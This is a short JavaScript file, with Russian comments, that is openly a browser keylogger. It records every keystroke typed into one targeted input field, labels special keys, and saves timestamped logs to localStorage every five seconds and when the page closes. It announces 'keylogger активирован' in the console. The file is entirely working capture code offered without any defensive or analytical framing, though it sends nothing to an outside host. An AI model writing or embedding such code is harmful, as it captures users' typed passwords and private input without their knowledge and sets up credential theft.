// script.js
(function() {
    const INPUT_SELECTOR = '#targetInput';
    const LOG_KEY = 'keylogData';
    const FLUSH_INTERVAL_MS = 5000;

    let buffer = [];
    let lastFlush = Date.now();

    function flushLog() {
        if (buffer.length === 0) return;
        const existing = localStorage.getItem(LOG_KEY) || '';
        const newEntry = {
            timestamp: new Date().toISOString(),
            chars: buffer.join('')
        };
        const updated = existing + JSON.stringify(newEntry) + '\n';
        localStorage.setItem(LOG_KEY, updated);
        buffer = [];
        lastFlush = Date.now();
    }

    function handleKeydown(e) {
        const input = document.querySelector(INPUT_SELECTOR);
        if (e.target !== input) return;

        let key = e.key;

        // Специальные клавиши
        if (key === 'Backspace') key = '[BACKSPACE]';
        else if (key === 'Enter') key = '[ENTER]\n';
        else if (key === 'Tab') key = '[TAB]';
        else if (key === 'Escape') key = '[ESC]';
        else if (key === 'Delete') key = '[DEL]';
        else if (key === 'ArrowUp') key = '[UP]';
        else if (key === 'ArrowDown') key = '[DOWN]';
        else if (key === 'ArrowLeft') key = '[LEFT]';
        else if (key === 'ArrowRight') key = '[RIGHT]';
        else if (key === 'Shift' || key === 'Control' || key === 'Alt' || key === 'Meta') {
            return; // игнорируем модификаторы
        }
        // Если клавиша даёт печатный символ — берём e.key (уже строка)
        else if (key.length === 1) {
            // ничего не меняем
        } else {
            // прочие (CapsLock, F1-F12 и т.д.)
            key = '[' + key.toUpperCase() + ']';
        }

        buffer.push(key);

        const now = Date.now();
        if (now - lastFlush >= FLUSH_INTERVAL_MS) {
            flushLog();
        }
    }

    // Сброс по таймеру на случай бездействия
    setInterval(flushLog, FLUSH_INTERVAL_MS);

    // Перехват перед закрытием страницы
    window.addEventListener('beforeunload', function() {
        flushLog();
    });

    document.addEventListener('keydown', handleKeydown);

    console.log('keylogger активирован. Данные в localStorage под ключом:', LOG_KEY);
})();
